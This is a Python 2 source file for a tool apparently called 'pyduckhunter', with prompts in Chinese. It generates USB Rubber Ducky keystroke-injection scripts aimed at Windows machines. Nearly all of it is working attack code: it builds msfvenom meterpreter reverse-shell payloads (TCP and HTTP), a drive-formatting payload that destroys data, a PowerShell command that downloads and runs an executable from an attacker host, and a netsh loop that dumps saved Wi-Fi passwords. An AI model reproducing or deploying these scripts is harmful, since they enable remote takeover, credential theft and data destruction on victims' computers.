#!/usr/bin/python env
#-*-coding:utf-8-*-
import os,sys
def demo():
    f = open('output/demo.txt', 'w')
    f.write("CAPSLOCK\n")
    f.write("GUI r\n")
    f.write("DELAY 1000\n")
    f.write("STRING notepad\n")
    f.write("DEALY 1000\n")
    f.write("Hello World\n")
    f.write("CAPSLOCK")
    f.close()
    f = open('output/demo.txt', 'r')
    f.readlines()
    print "[\033[1;32;1m+\033[0m]文件生成在 output/demo.txt"
def c1():
    print "\n1. Powershell Execute\n"
    print "\n2. Powershell Download and Execute\n"
    choise = raw_input("[\033[1;32;1mpyduckhunter>\033[0m]")
    if choise =="1":
        print "\n1. windows/meterpreter/reverse_tcp\n"
        print "\n2. windows/meterpreter/reverse_http\n"
        print "\n3. format_all_drives(warning!)\n"
        choise = raw_input("[\033[1;32;1mpyduckhunter>\033[0m]")
        if choise =="1":
            lhost = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入LHOST:")
            lport = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入LPORT:")
            def msfvenom(lhost,lport):
                c = "msfvenom -p windows/meterpreter/reverse_tcp lhost="+lhost+" lport="+lport+" -f psh-cmd"
                return c
            shellout = os.popen(msfvenom(lhost,lport)).read()
            f = open('output/out_reverse_tcp.txt','w')
            f.write("CAPSLOCK\n")
            f.write("DELAY 1000\n")
            f.write("GUI r\n")
            f.write("DELAY 1000\n")
            f.write("STRING cmd\n")
            f.write("DELAY 1000\n")
            f.write("STRING ")
            f.write(shellout.swapcase())
            f.write("\n")
            f.write("CAPSLOCK")
            f.close()
            f = open('output/out_reverse_tcp.txt','r')
            f.readlines()
            print "[\033[1;32;1m+\033[0m]文件生成在 output/out_reverse_tcp.txt"
        elif choise == "2":
            lhost = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入LHOST:")
            lport = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入LPORT:")
            def msfvenom(lhost, lport):
                c = "msfvenom -p windows/meterpreter/reverse_http lhost=" + lhost + " lport=" + lport + " -f psh-cmd"
                return c
            shellout = os.popen(msfvenom(lhost, lport)).read()
            f = open('output/out_reverse_http.txt', 'w')
            f.write("CAPSLOCK\n")
            f.write("DELAY 1000\n")
            f.write("GUI r\n")
            f.write("DELAY 1000\n")
            f.write("STRING cmd\n")
            f.write("DELAY 1000\n")
            f.write("STRING ")
            f.write(shellout.swapcase())
            f.write("\n")
            f.write("CAPSLOCK")
            f.close()
            f = open('output/out_reverse_http.txt', 'r')
            f.readlines()
            print "[\033[1;32;1m+\033[0m]文件生成在 output/out_reverse_http.txt"
        elif choise == "3":
            name = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入格式化之后的盘符:")
            def msfvenom(name):
                c = "msfvenom -p windows/format_all_drives VOLUMELABEL=" + name + " -f psh-cmd"
                return c
            shellout = os.popen(msfvenom(name)).read()
            f = open('output/format_all_drives.txt', 'w')
            f.write("CAPSLOCK\n")
            f.write("DELAY 1000\n")
            f.write("GUI r\n")
            f.write("DELAY 1000\n")
            f.write("STRING cmd\n")
            f.write("DELAY 1000\n")
            f.write("STRING ")
            f.write(shellout.swapcase())
            f.write("\n")
            f.write("CAPSLOCK")
            f.close()
            f = open('output/format_all_drives.txt', 'r')
            f.readlines()
            print "[\033[1;32;1m+\033[0m]文件生成在 output/format_all_drives.txt"
    elif choise == "2":
        lhost = raw_input("\n[\033[1;32;1mpyduckhunter>\033[0m] 请输入下载后门地址:")
        f = open('output/out_powershell_download_execute.txt', 'w')
        f.write("CAPSLOCK\n")
        f.write("DELAY 1000\n")
        f.write("GUI r\n")
        f.write("DELAY 1000\n")
        f.write("STRING cmd\n")
        f.write("DELAY 1000\n")
        f.write("STRING ")
        shellout = "powershell -Command $clnt = new-object System.Net.WebClient;$url=http://"+lhost+"/x.exe';$file = ' %HOMEPATH%\\x.exe ';$clnt.DownloadFile($url,$file);\n"
        f.write(shellout.swapcase())
        f.write("DELAY 1000\n")
        f.write("STRING ")
        f.write("%HOMEPATH%\\x.exe;\n")
        f.close()
        f = open('output/out_powershell_download_execute.txt', 'r')
        f.readlines()
        print "[\033[1;32;1m+\033[0m]文件生成在output/out_Powershell_Download_and_Execute.txt"
def c2():
    f = open('output/out_wirless.txt', 'w')
    f.write("CAPSLOCK\n")
    f.write("DELAY 1000\n")
    f.write("GUI r\n")
    f.write("DELAY 1000\n")
    f.write("STRING cmd\n")
    f.write("DELAY 1000\n")
    f.write("STRING ")
    shellout = "for /f "'\"skip=9 tokens=1,2 delims=:" %i in (''\'netsh wlan show profiles''\') do  @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear\n'
    f.write(shellout.swapcase())
    f.write("CAPSLOCK")
    f.close()
    f = open('output/out_wirless.txt', 'r')
    f.readlines()
    print "[\033[1;32;1m+\033[0m]文件生成在 output/out_wirless.txt"
